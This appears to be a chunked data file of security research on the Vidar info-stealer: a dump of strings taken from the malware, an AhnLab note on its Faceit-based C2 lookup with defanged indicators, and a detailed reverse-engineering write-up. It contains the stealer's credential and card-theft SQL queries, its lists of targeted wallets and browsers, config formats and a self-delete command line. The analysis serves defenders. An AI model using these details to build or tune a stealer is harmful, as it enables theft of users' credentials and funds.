\\Exodus\\exodus.wallet\\ passphrase.json seed.seco info.seco ElectronCash \\ElectronCash\\wallets\\ default_wallet MultiDoge \\MultiDoge\\ multidoge.wallet JAXX \\jaxx\\Local Storage\\ file__0.localstorage Atomic \\atomic\\Local Storage\\leveldb\\ 000003.log CURRENT LOCK LOG MANIFEST-000001 0000* Binance \\Binance\\ app-store.json Coinomi \\Coinomi\\Coinomi\\wallets\\ *.wallet *.config wallet_path SOFTWARE\\monero-project\\monero-core \\Monero\\ SELECT fieldname, value FROM moz_formhistory \\files\\Soft \\files\\Soft\\Authy \\Authy Desktop\\Local Storage\\ \\Authy Desktop\\Local Storage\\*.localstorage \\Opera Stable\\Local State INSERT_KEY_HERE JohnDoe HAL9TH api.faceit.com /core/v1/nicknames/ about Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 C:\\ProgramData\\ .exe :Zone.Identifier [ZoneTransfer] ZoneId=2 Windows ProgramData RECYCLE.BIN Config.Msi System Volume Information msdownld.tmp Recovery Local\\Temp Program Files Recycle.Bin All Users MicrosoftEdge\\Cookies Users\\Public Local\\Packages Local\\NuGet

9/13"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|e09a34f8f18e4e5486646013f20cf488
"9/13

Roaming\\WinRAR Local\\Microsoft Microsoft fee_estimates peers mempool banlist governance mncache mnpayments netfulfilled passwords.txt Login Data Cookies Web Data \\files\\Autofill \\files\\Cookies \\files\\CC \\files\\History \\files\\Downloads \\files\\ \\files\\Files hwid os platform profile user cccount fcount telegram ver vaultcli.dll VaultOpenVault VaultCloseVault VaultEnumerateItems VaultGetItem VaultFree SELECT url FROM moz_places %s\\Mozilla\\Firefox\\profiles.ini \\signons.sqlite SELECT encryptedUsername, encryptedPassword, formSubmitURL FROM moz_logins \\logins.json formSubmitURL usernameField encryptedUsername encryptedPassword guid SELECT host, name, value FROM moz_cookies SELECT origin_url, username_value, password_value FROM logins SELECT name, value FROM autofill SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards SELECT target_path, tab_url from downloads SELECT url, title from urls SELECT HOST_KEY, is_httponly, path, is_secure, (expires_utc/1000000)-11644480800, name, encrypted_value from cookies C:\\Users\\ \\AppData\\Roaming\\FileZilla\\recentservers.xml <Host> <Port> <User> <Pass encoding=\ Soft: FileZilla\n \\AppData\\Roaming\\.purple\\accounts.xml <protocol> <name>

10/13

<password>

Soft: Pidgin\n

\\Thunderbird\\Profiles\\

C:\\Program Files (x86)\\Mozilla Thunderbird

APPDATA

LOCALAPPDATA

Thunderbird

\\files\\Telegram

\\Telegram Desktop\\tdata\\



D877F783D5D3EF8C"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|c9eae4e1276344568e89a5d8741026a6
"APPDATA

LOCALAPPDATA

Thunderbird

\\files\\Telegram

\\Telegram Desktop\\tdata\\



D877F783D5D3EF8C



\\Telegram Desktop\\tdata\\

key_datas

\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\



map



\\Telegram Desktop\\tdata\\D877F783D5D3EF8C\\

firefox.exe

plugin



container.exe

update_notifier.exe

Mozilla Firefox

\\Mozilla\\Firefox\\Profiles\\

Pale Moon

\\Moonchild Productions\\Pale Moon\\Profiles\\

Waterfox

\\Waterfox\\Profiles\\

Cyberfox

\\8pecxstudios\\Cyberfox\\Profiles\\

BlackHawk

\\NETGATE Technologies\\BlackHawk\\Profiles\\

IceCat

\\Mozilla\\icecat\\Profiles\\

K



Meleon

\\K



Meleon\\

Google Chrome

\\Google\\Chrome\\User Data\\

Chromium

\\Chromium\\User Data\\

Kometa

\\Kometa\\User Data\\

Amigo

\\Amigo\\User Data\\

Torch

\\Torch\\User Data\\

Orbitum

\\Orbitum\\User Data\\

Comodo Dragon

\\Comodo\\Dragon\\User Data\\

Nichrome

\\Nichrome\\User Data\\

Maxthon5

\\Maxthon5\\Users\\

Sputnik

\\Sputnik\\User Data\\

Epic Privacy Browser

\\Epic Privacy Browser\\User Data\\

Vivaldi

\\Vivaldi\\User Data\\

CocCoc

\\CocCoc\\Browser\\User Data\\

URAN

\\uCozMedia\\Uran\\User Data\\

QIP Surf

\\QIP Surf\\User Data\\

Cent Browser

\\CentBrowser\\User Data\\

11/13

Elements Browser

\\Elements Browser\\User Data\\

TorBro Browser

\\TorBro\\Profile\\

Suhba Browser

\\Suhba\\User Data\\

Mustang Browser

\\Rafotech\\Mustang\\User Data\\

Chedot Browser

\\Chedot\\User Data\\

Brave_Old

\\brave\\

7Star

\\7Star\\7Star\\User Data\\"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|64f4eb7acc71480b8974de671ef42b24
"Mustang Browser

\\Rafotech\\Mustang\\User Data\\

Chedot Browser

\\Chedot\\User Data\\

Brave_Old

\\brave\\

7Star

\\7Star\\7Star\\User Data\\

Microsoft Edge

\\Microsoft\\Edge\\User Data\\

360 Browser

\\360Browser\\Browser\\User Data\\

QQBrowser

\\Tencent\\QQBrowser\\User Data\\

Opera

\\Opera Software\\Opera Stable\\

OperaGX

\\Opera Software\\Opera GX Stable\\

Local State

Cookies

%s_%s.txt

TRUE

FALSE

\\Microsoft\\Windows\\Cookies\\Low\\

Cookies\\IE_Cookies.txt

\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies\\

Cookies\\Edge_Cookies.txt

\\files\\Wallets

%USERPROFILE%

%DESKTOP%

KERNEL32.DLL

LoadLibraryA

GetProcAddress

VirtualAllocExNuma

gdi32.dll

ole32.dll

user32.dll

psapi.dll

BCRYPT.DLL

BCryptCloseAlgorithmProvider

BCryptDestroyKey

BCryptOpenAlgorithmProvider

BCryptSetProperty

BCryptGenerateSymmetricKey

BCryptDecrypt

CRYPT32.DLL

CryptUnprotectData

CryptStringToBinaryA

C:\\ProgramData\\nss3.dll

NSS_Init

NSS_Shutdown

PK11_GetInternalKeySlot

PK11_FreeSlot

PK11_Authenticate

PK11SDR_Decrypt

advapi32.dll

RegOpenKeyExA

RegQueryValueExA

12/13

RegCloseKey

RegOpenKeyExW

RegGetValueW

RegEnumKeyExA

RegGetValueA

GetUserNameA

GetCurrentHwProfileA

wininet.dll

InternetCloseHandle

InternetReadFile

HttpSendRequestA

HttpOpenRequestA

InternetConnectA

InternetOpenA

HttpAddRequestHeadersA

HttpQueryInfoA

InternetSetFilePointer

InternetOpenUrlA

InternetSetOptionA

DeleteUrlCacheEntry"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|7faf1a3d792e4effa729963912f323f9
"InternetOpenA

HttpAddRequestHeadersA

HttpQueryInfoA

InternetSetFilePointer

InternetOpenUrlA

InternetSetOptionA

DeleteUrlCacheEntry

CreateCompatibleBitmap

SelectObject

BitBlt

DeleteObject

CreateDCA

GetDeviceCaps

CreateCompatibleDC

CoCreateInstance

CoUninitialize

GetDesktopWindow

ReleaseDC

GetKeyboardLayoutList

CharToOemA

GetDC

wsprintfA

EnumDisplayDevicesA

GetSystemMetrics

GetModuleFileNameExA

GetModuleBaseNameA

EnumProcessModules

13/13"|data_input/vidar_reports/entry_3829a1e9-fce1-4de0-96a3-4e4ef0b872e3.text|834cfc03c1044bc0a9d84c2189bb88e0
"Vidar Info



Stealer Abusing Game Platform

asec.ahnlab.com/en/22932/

May 24, 2021

The ASEC analysis team has recently found out that the Vidar info-stealer malware is abusing a game matching program named Faceit to create C&C server URL. Vidar is malware that has been steadily distributed from the past disguised as spam mail, PUP, and KMSAuto authentication tool. Before it performs info-stealing activities, it connects to C&C server to receive commands and download additional DLL files to collect user information. In the past, the malware simply connected to C&C server and received commands and additional files like other malware. Yet the recent Vidar abuses online gaming platforms to actually create C&C server. Faceit is a platform which supports game matching for online game users. It supports various online games such as PLAYERUNKNOWN’S BATTLEGROUNDS, DOTA 2, and Counter Strike: Global Offensive.

1/6

List of games supported by Faceit As for Vidar abusing the platform, it first creates an API URL for faceit.com before communicating with the C&C server. The URL created by the routine shown below is as follows: ‘sslamlssa’ is the attacker’s Faceit ID. – hxxps://api.faceit[. ]com/core/v1/nicknames/sslamlssa

2/6

Routine for

creating C&C URL When Vidar requests HTTP GET for the URL shown above, it receives the json format data from faceit.com. The malware parses the ‘about’ part in the data, which is the actual URL for the C&C server. – hxxp://188.34.193[. ]205

3/6"|data_input/vidar_reports/entry_cef17305-f366-4ac4-8f16-b376f88f11b6.text|58dde3775b3240a69c2107a6fef4334c
"3/6

Data received from faceit.com

API result for the malicious user

When logged in to faceit.com, the malware’s C&C server address is shown in the ABOUT part of the profile page of the user ‘sslamlssa’.

4/6

Malicious user’s profile If the attacker edits the About part and enters another address, the Vidar info-stealer will connect to the changed C&C server and continue to perform malicious activities. If Faceit’s attacker account is not blocked, the attacker can repeatedly edit the C&C server to make the same malware connect to different C&C servers. It is likely that the attacker is using the method to bypass network detection for the C&C URL. Vidar connects to the actual C&C servers established and receives DLL files needed for commands and info-stealing, and ultimately sends the stolen information to the C&C server. See the data sent below, which shows that Vidar’s version is v38.6.

Vidar’s network behavior When a suspicious-looking email arrives, users should not open the attachment file, try to use a genuine software at all times, and refrain from using suspicious websites and P2P. Also, update V3 to the latest version so that malware infection can be prevented. AhnLab’s anti-malware software, V3, detects and blocks the malware using the following aliases: [File Detection] – Trojan/Win.Generic.C4452995 (2021.05.06.01)

5/6"|data_input/vidar_reports/entry_cef17305-f366-4ac4-8f16-b376f88f11b6.text|2c349b47e7a145ffb626a339d1b682ef
"5/6

[Behavior Detection] – Malware/MDP.Behavior.M1965 – Malware/MDP.Inject.M3034 – Malware/MDP.Behavior.M3108 [IOC] File 5a9c15ad92f14ce0b36726ccd4eb4ef7 C&C – hxxps://api.faceit[. ]com/core/v1/nicknames/sslamlssa – hxxp://188.34.193[. ]205 Categories:Malware Information Tagged as:Battleground, Counter Strike, FaceIt, InfoStealer, vidar

6/6"|data_input/vidar_reports/entry_cef17305-f366-4ac4-8f16-b376f88f11b6.text|f9b0b03b807c475a81ab3f3bd84d5d5e
"Let’s dig into Vidar – An Arkei Copycat/Forked Stealer (In-depth analysis) fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/ fumko

December 24, 2018

Sometimes when you are reading tons and tons of log of malware analysis, you are not expecting that some little changes could be in fact impactful. I paid the price when I was analyzing a supposed Arkei malware. my Yara rule at that time was supposed to trigger this malware, but after some reversing, I realized that I was confronted with something different. Some strings linked to Arkei signature was deleted and a new one appeared with the string “Vidar”, there are also some other tweaks in the in-depth analysis that proves there are some differences (but small), but all the rest was totally identical to Arkei. The malware is written in C++, seems to have started activities at the beginning of October 2018 and have all the kind of classic features of stealers: Searching for specific documents Stealing ID from cookie browsers Stealing browser histories (also from tor browser) Stealing wallets Stealing data from 2FA software

1/38"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|cfb5c34f05da4ee3a9f86f325fac8585
"1/38

Grabbing message from messenger software Screenshot Loader settings Telegram notifications (on server-side) Get a complete snapshot of all information of the computer victim Sold with a range of 250-700$, this stealer on shop/forums and when people buy it, they have access to a C2 Shop portal where they are able to generate their own payloads. So there is no management on their side. Also, domains who leads to the C2/Shop are changed every 4 days. For this in-depth analysis, I will inspect the 4.1 version of Vidar, take an overview of the admin panel, catching the differences with Arkei.

Basic Countries by-passing So first of all, we have some classic pattern to quit the program if the victim machines are configured in some language with the help of GetUserDefaultLocaleName. This is one of the easy tricks to check if the malware is not infected users from specific countries.

As explained in the MSDN, A “locale” is a collection of language-related user preference information represented as a list of values, the stealer will check if the language is corresponding with the list of countries that mentioned below.

With a few seconds of searching on google, it’s easy to understand which countries are behind the locale names : Locale

Country

ru



RU

Russia

2/38

be



BY

Belarus

uz



UZ

Uzbekistan

kk



KZ

Kazhakstan

az



AZ

Azerbaijan"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|b06b79fe5968427db7d464c8c0651428
"Country

ru



RU

Russia

2/38

be



BY

Belarus

uz



UZ

Uzbekistan

kk



KZ

Kazhakstan

az



AZ

Azerbaijan

LCID Structure – https://msdn.microsoft.com/en-us/library/cc233968.aspx Language Code Table – http://www.lingoes.net/en/translator/langcode.htm LocaleName – https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locale-names Locale – https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locales-and-languages

Mutex generation The mutant string generated by Vidar is unique for each victim, but simple to understand how it is generated. This is just a concatenation of two strings : Hardware Profile ID GetCurrentHwProfileA is used to retrieve the current hardware profile of the computer with the value of szHwProfileGuid. If it fails, it will return “Unknown” here.

The Machine GUID With the help of RegOpenKeyExA, the value of the registry key is fetched: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid

This is the UUID created by Windows during the installation of the operating system.

3/38

When it’s done, the mutex is created, just like this :

String setup When Vidar is entering in the main function, it needs to store some required strings to be able to work properly for some further steps.

All the RVA address of each string are stored in the .data section. The malware will go there to access to the requested string.

This is a trick to slow down the static analysis of the malware, but this is really easy to surpass

🙂"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|32449ef323524f69bb33362ecc3f2697
"This is a trick to slow down the static analysis of the malware, but this is really easy to surpass

🙂

C2 Domain & Profile ID When the malware is generated by the builder on the customer area. A unique ID is hardcoded into it. When Vidar will request this value on the malicious domain, it will retrieve the corresponding profile that the threat actor wants to grab/steal into the victim machine. So on this case, this the profile ID is “178”. If there is no config on the malware, the profile ID “1” is hardcoded into it.

4/38

The C2 domain is a simple XORed string, the key is directly put into the XOR function to decrypt the data.

And decrypted it’s in fact “newagenias.com”

Configs are possible to be extracted easily with the script izanami.py on my GitHub repository.

How to understand the config format For example, this is default configuration the malware could get from the C2 :

5/38

1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;*.txt:*.dat:*wallet*.*:*2fa*.*:*backup*.*:*code*.*:*password*.*:*auth*.*:*google*.*:*utc*.*:*UTC*. *:*cryp Each part have the “;” in delimiter, so let’s dig into it First part 1

Saved password

1

Cookies / AutoFill

1

Wallet

1

Internet History

1

??? – Supposed to be Skype (not implemented)

1

??? – Supposed to be Steam (not implemented)

1

Telegram

1

Screenshot

1

Grabber

1

?? ?

250

Max Size (kb)

Default

Name of the profile (also used for archive file into the files repository)

Second part

%DESKTOP %"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|67cd26b68994449db4fd1e61fe6def39
"Grabber

1

?? ?

250

Max Size (kb)

Default

Name of the profile (also used for archive file into the files repository)

Second part

%DESKTOP %

Selected folder repository where the grabber feature will search recursively (or not) some selected data

Third part



.txt:



.dat:



wallet



.



:



2fa



.



:



backup



.



:



code



.



:



password



.



:



auth



.



:



google



.



:



utc



.



:



UTC



.



:



crypt



.



:



key



.



Fourth part

50

Max Size per file (kb)

true

Collect Recursively

Fifth part:

movies:music:mp3; This is the exception part, the grabber will avoid those strings if it matches in the files searched recursively in the specific wanted folder. The setup is quite a mess if we are looking into the code. each option is stored into a byte or dword variable.

6/38

Folder generation To summarize all kind of possibles files/folders that will be generated for the malicious repository is in fact pretty simple : \\files \\files\\Autofill \\files\\CC \\files\\Cookies \\files\\Downloads \\files\\Files \\files\\History \\files\\Soft \\files\\Soft\\Authy \\files\\Telegram \\files\\Wallets

<- Master folder <- Auto-Fill files <- Credit Cards <- Cookies <- Downloaded data history from browsers <- Profile configs (Archives) <- Browser histories <- Master folder for targeted softwares <- 2FA software <- Telegram messages <- Cryptomining Wallets

Generalist files

\\files\screenshot.jpg

\\files\passwords.txt"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|5e2e83267521459a8b9f3b26c0dbe644
"Generalist files

\\files\screenshot.jpg

\\files\passwords.txt

\\files\\information.txt

<- Actual screenshot of the screen <- Passwords consolidated all at once <- Snapshot of the computer setup

Libraries necessary to grab some data Something that I love when I read some malware specs, it’s when they said that the product could be launched without the necessity to have some runtime libraries or other required software on the machine. But when you dig into the code or just watching some network flow, you can see that the malware is downloading some DLL to be able to do some tasks.

7/38

And for this case, they are required during the stealing process of different kind of browsers. freebl3.dll

Freebl Library for the NSS (Mozilla Browser)

mozglue.dll

Mozilla Browser Library

msvcp140.dll

Visual C++ Runtime 2015

nss3.dll

Network System Services Library (Mozilla Browser)

softokn3.dll

Mozilla Browser Library

vcruntime140.dll

Visual C++ Runtime 2015

They are deleted when the task is done.

FTP

List of supported software

FileZilla

WinSCP

2FA software Something that I found interesting on this malware is that also 2FA software is also targeted, a feature that I considered not seen really in the wild, and pretty sure this will be more and more common in the future. With the multiplication of those kinds of protection. Victims must understand that 2FA is not the ultimate way to protect accounts from hackers, this could be also another door for vulnerabilities

🙂"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|7400d5b25daf4bc39899bd92b44cb1f1
"🙂

So with Vidar, the Authy software is targeted…

8/38

More specifically the SQLite file on the corresponding application on %APPDATA% repository. It looks like this is the same operating where stealer wants to steal data with software like Discord or Chrome.

So guys, be careful with your 2FA software

🙂

Browsers Something interesting to mention, this bad boy is also stealing Tor Browser stuff.

9/38

List of supported Browsers 360 Browser Amigo BlackHawk Cent Browser Chedot Browser Chromium CocCoc Comodo Dragon Cyberfox Elements Browser Epic Privacy Google Chrome IceCat Internet Explorer K-Meleon Kometa Maxthon5 Microsoft Edge Mozilla Firefox Mustang Browser Nichrome Opera Orbitum Pale Moon QIP Surf QQ Browser Sputnik Suhba Browser Tor Browser Torch URAN Vivaldi Waterfox Of course, this list could be more important than this if there are some browsers based on chromium repository.

Messengers/Mailer I will not explain here, how it works, but the technique is the same that I’ve explained in my previous blog post. (Especially for the Telegram part). Bat! Pidgin Telegram Thunderbird

Wallets

Anoncoin

BBQCoin

Bitcoin

DashCore

DevCoin

DigitalCoin

Electron Cash

ElectrumLTC

Ethereum

Exodus

FlorinCoin

FrancoCoin

JAXX

Litecoin

MultiDoge

10/38

TerraCoin YACoin Zcash Of course, this list could change if the customer added some additional files to search on specific areas on the victim machine."|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|bd665127e7e845a3a0f75a68c469a70b
"Grabber The grabber feature is by far, the most complicated feature of the malware and what he looks to be really different from Arkei, in term of implementation. So first of all, it will skip or not the grabber feature by checking in config file downloaded, if this is activated. Preparing the strings for creating the folder path and when all is set func_grabber could be used.

When inspecting the func_grabber, I was not prepared to have this :

11/38

By far, when I saw this, I was not really happy to reverse this. I mean, I know I was falling in some unexpected allocated memory into my brain. I had all the magnificent stuff that all malware reverser love (or not at all) : Weird conditions come out the blue. Calling function that will call other functions like Russian wooden dolls API calls etc… But if we are watching these at a macro view, it’s, in fact, easier than it looks like. I will just show just one example. So in the example below, if the string %APPDATA% is present in the config downloaded from the C2. it will enter into the function and will start a bunch of verifications. Until entering into the most important one called func_VidarSearchFile

12/38

After the process will remain almost the same for each scenario. This is at least, all the repositories available in the grabber feature : %ALL_DRIVES% (GetDriveTypeA Necessary) %APPDATA% %C% %D% %DESKTOP% %DOCUMENTS% %DRIVE_FIXED% %DRIVE_REMOVABLE% %LOCALAPPDATA% %USERPROFILE%"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|22578c8a41d14cdfa9168bd2e0d2e7e4
"Screenshot The generation of the screenshot is easy to understand : First GdiplusStartup function is called to initialize the Windows GDI+ Then an alternative to GetDeviceCaps is called for getting the height of the screen on the display monitor with the value SM_CYSCREEN (1) with GetSystemMetrics this will be the same thing with SM_CXSCREEN (0) for the width.

13/38

Now, it needs a DC object for creating a compatible bitmap necessary to generate our image by selecting the windows DC into the compatible memory DC and using a Bit Block API function to transfer the data. When all is done, it will enter into func_GdipSaveImageToFile

So now its needed to collect the bits from the generated bitmap and copies them into a buffer that will generate the screen capture file.

Information Log So let’s dig into information.txt, to understand how this file is generated. I will mention only some parts of the creation, another part will be just the corresponded API call, breakpoint on these API if you want to take your time to analyze all the step easily.

14/38

First, it indicates which version of Vidar is used.

If you don’t see a Vidar on the log file. It means that you have an early version of it. Date

GetSystemTimeAsFileTime

MachineID

Explained Above

GUID

GetCurrentHwProfileA

Path

GetModuleFileNameExA

Work Dir

Hardcoded string + func_FolderNameGeneration"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|b6cacf8df3994edaaca29fcae9d14bc9
"MachineID

Explained Above

GUID

GetCurrentHwProfileA

Path

GetModuleFileNameExA

Work Dir

Hardcoded string + func_FolderNameGeneration

Get the name of the operating system and platform is classic because this is, in fact, a concatenation of two things. First, with RegOpenKeyExA, the value of this registry key is fetched: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName

Secondly, for knowing if Windows is 32 or 64-bit, it checks itself if is running on WOW64 with the help of IsWow64Process.

Computer Name

GetComputerNameA

User Name

GetUserNameA

For the current screen resolution used, CreateDCA is called to create a device context for “Display” and requesting the Width and Height of the Device with GetDeviceCaps.

15/38

This remains to this source code : HDC hDC = CreateDCA(""DISPLAY"", NULL, NULL, NULL); int width = GetDeviceCaps(hDC, HORZRES); // HORZRES = 0x8 int height = GetDeviceCaps(hDC, VERTRES); // VERTRES = 0x0A

Let’s continue our in



depth analysis…

Display Language

GetUserDefaultLocaleName

Keyboard Languages

GetKeyboardLayoutList / GetLocaleInfoA

Local Time

GetSystemTimeAsFileTime

TimeZone

TzSpecificLocalTimeToSystemTime

Hardware ??? the process name, the value of the registry key is fetched: HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\ProcessorNameString

CPU Count

GetSystemInfo.dwNumberOfProcessors

RAM

GlobalMemoryStatusEx

VideoCard

EnumDisplayDevicesW"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|c4cb417f4f414f4194a6a62cbcc062f5
"CPU Count

GetSystemInfo.dwNumberOfProcessors

RAM

GlobalMemoryStatusEx

VideoCard

EnumDisplayDevicesW

Network The network part is quite easy, it’s a translation of data retrieves on ip-api.com/line/ and put into the log, at the corresponding place.

16/38

Processes There is quite soft stuff done to get a snapshot of all the processes at the time where the stealer is executed.

But in the end, this is not complicated at all to understand the different steps. Request CreateToolhelp32Snapshot, to get the complete snapshot of all the processes executed, and read one per one in a loop all with Process32First

17/38

After, checking if it’s a parent process or a child process, Vidar will grab two value of the PROCESSENTRY32 object : th32ProcessID: PID szExeFile: The name of the PE

Software For the list of all installed software, the value of this registry key is fetched: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

And these values are retrieves of each software. DisplayName DisplayVersion

18/38

Results So for example, if you want to see the results, let’s see into one sandbox analysis, the generated information.txt (this is a Vidar 4.2 here)

19/38"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|b174bec3016945c68e0277b39b2b287c
"19/38

Vidar Version: 4.2 Date: Thu Dec 13 14:39:05 2018 MachineID: 90059c37-1320-41a4-b58d-2b75a9850d2f GUID: {e29ac6c0-7037-11de-816d-806e6f6e6963} Path: C:\Users\admin\AppData\Local\Temp\toto.exe Work Dir: C:\ProgramData\LDGQ3MM434V3HGAR2ZUK Windows: Windows 7 Professional [x86] Computer Name: USER-PC User Name: admin Display Resolution: 1280x720 Display Language: en-US Keyboard Languages: English (United States) Local Time: 13/12/2018 14:39:5 TimeZone: UTC-0 [Hardware] Processor: Intel(R) Core(TM) i5-6400 CPU @ 2.70GHz CPU Count: 4 RAM: 3583 MB VideoCard: Standard VGA Graphics Adapter [Network] IP: 185.230.125.140 Country: Switzerland (CH) City: Zurich (Zurich) ZIP: 8010 Coordinates: 47.3769,8.54169 ISP: M247 Ltd (M247 Ltd) [Processes] - System [4] ---------- smss.exe [264] - csrss.exe [344] < ... > [Software] Adobe Flash Player 26 ActiveX [26.0.0.131] Adobe Flash Player 26 NPAPI [26.0.0.131] Adobe Flash Player 26 PPAPI [26.0.0.131] < ... >

Loader The task is rudimentary but enough to do the job : Generating a random name for the downloaded payload Download the payload Execute

20/38"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|0a7cae1b109d491f93e648374688e596
"Loader The task is rudimentary but enough to do the job : Generating a random name for the downloaded payload Download the payload Execute

20/38

When the binary file is downloaded from the C2, it’s using CreateFileA with specific parameters : edi : The downloaded data from the C2 80h : “The file does not have other attributes set. This attribute is valid only if used alone.” 2 : This option will force the overwriting if the filename already exists. edi : ??? 1 : “Enables subsequent open operations on a file or device to request read access.” Otherwise, other processes cannot open the file or device if they request read access.” 40000000h : Write access (GENERIC_WRITE) ebp+lpFileName : The generated filename When it’s done, it only needs to Write content into the files (WriteFile) and then close the corresponding handle (CloseHandle)

21/38

So now, the file is downloaded and saved into the disk, it only needs to be launched with ShellExecuteA. So don’t hesitate to breakpoint this API function, for grabbing the payload before it’s too late for further analysis.

Killing Part So when all the task of the stealer is finally accomplished and cleaned, the stealer needs to erase itself. So first of all, it retrieves this own PID with the help of GetCurrentProcessId."|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|b60f0d5e39c34bc086c7903736b3b3d7
"When it’s done, it enters into “func_GetProcessIdName”, tries to open a handle on his own process with OpenProcess, if it failed, it continues to check and in the end the most important task here is to call GetModuleBaseNameA, which it permits to retrieve the name of the process name with the help of the PID that was obtained before.

Some strings that are hardcoded on .rdata section are called and saved for future purposes.

22/38

When the request is finely crafted, Vidar is simply using ShellExecuteA to pop a command shell and executing the task, this permit to erase all trace of the interaction of the payload on the machine.

So if we want a quick overview of the executed command: C:\Windows\System32\cmd.exe” /c taskkill /im vidar.exe /f & erase C:\Users\Pouet\AppData\Local\Temp\vidar.exe & exit Literally: Offset File + db ‘/c taskkill /im’ + [GetModuleBaseNameA] + db ‘ /f & erase’ + [GetModuleFileNameExA + GetModuleBaseNameA]+ + db ‘ & exit’

Sending archive to the C2 Folder generation COUNTRY + “_” + Machine GUID + “.zip” in example : NG_d6836847-acf3-4cee-945d-10c9982b53d1.zip Last POST request During the generation of the POST request, the generated HTTP packet is tweaked to add some additional content that the C2 server will read and process data.

Each name at the end of the string will be the corresponding field to be saved into the database. This at least, all the different ContentDisposition that will be added to the HTTP request. hwid

Hardware ID

os"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|2c475e4a389e4e799a608a62376525f4
"Hardware ID

os

Operating System

platform

32 or 64 bits System

profile

C2 Profile ID

user

Name of the victim account

23/38

cccount

Number of Credit Cards stolen

ccount

Number of Coins Stolen (CryptoWallet)

fcount

Number of files stolen

telegram

Telegram

ver

The version of the Vidar malware

🙂

Also, there is a little trick here that I found nice. Here, the answer to the POST request is in fact, containing the config for the loader. If there is nothing, the response is “ok” If there is something, the specified url(s) are stored.

Its the same thing used for the config and the network information. Example with a sandbox : The POST request

The response of this POST request (select the tab)

24/38

Server-Side Because it’s easy to find some information about the stealer, no needs to dig hard to have some marketplace where Vidar is sold. So let’s see how it looks like by looking some classical commercial video (all the screenshot are collected from there), for attracting some possible customers. This could be completely different at that time, but it’s what it was looking like at the beginning of November. Login

Dashboard The panel is a classical fancy user-friendly interface, with all the basic information necessary for the customer to have a fast view how is goin’ his business. The current version of the builder Until when he is able to generate some payloads How many victims The current balance on his account to re-subscribe again

25/38"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|65595b69c0ec4ae9b29a699bbc068819
"25/38

Logs something to mention with the log part is that it’s possible to put some notes on each data.

Passwords

Builder The builder tab is also pretty interesting because we have the changelog information about the stealer and on the download part, the malware generated will not be packed and this is the same scenario with Arkei. Customer/Threat actor must have to use his own crypter/packer software for his payload.

26/38

Settings The most important tab is obviously where it is possible to configure the payload, for grabbing some additional stuff on the machine with the profiles. Activate or deactivate some features to filtering the stealer for really specific purposes. It’s also important to notify, that it’s possible with Vidar to deploy multiple profiles at the same time. It means when the payload is infecting the victim machine, X archive for X profile is saved in “files” repository. The customer could be able to sort easily for malicious purposes after the grabbed data.

When editing or creating a new rule, we have this prompt panel appearing and this is in relation with what explained above with all possible path that the malware is able to search with the selected files.

27/38

After checking a little, there is plenty of profiles on the C2. This is what we could found: Default empty config: 1,1,1,1,1,1,1,1,0,1,250,none;

Default initialized config:

1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;



.txt:



.dat:



wallet



.



:



2fa



.



:



backup"|data_input/vidar_reports/entry_36e87c5a-d393-4032-acc2-dd47ebe41efe.text|9942dc2bcb4e4e128103ff337473db53
"Default initialized config:

1,1,1,1,1,1,1,1,1,1,250,Default;%DESKTOP%\;



.txt:



.dat:



wallet



.



:



2fa



.



:



backup



.



:



code



.



:



password



.



:



auth



.



:



google



.



:



utc*

Examples of custom profiles:

1,1,1,1,1,1,1,1,1,1,250,grabba;%DESKTOP%\;



.txt:



.dat:



wallet



.



:



2fa



.



:



backup



.



:



code



.



:



password



.



:



auth



.



:



google



.



:



utc



.

1,1,0,1,1,1,1,1,1,1,250,инфа;%DESKTOP%\;



.txt:



.dat:



wallet



.



:



2fa



.



:



backup



.



:



code



.



:



password



.



:



auth



.



:



google



.



:



utc



.



:

1,1,1,1,1,1,1,1,1,1,250,Первое;%DESKTOP%\;



.txt:



wallet



.



:



2fa



.



:



backup



.



:



code



.



:



password



.



;50;true;movies:music:mp3;

1,1,1,1,1,1,1,1,1,1,250,123435566;%DESKTOP%\;



.txt:



.dat:



wallet



.



:



2fa



.



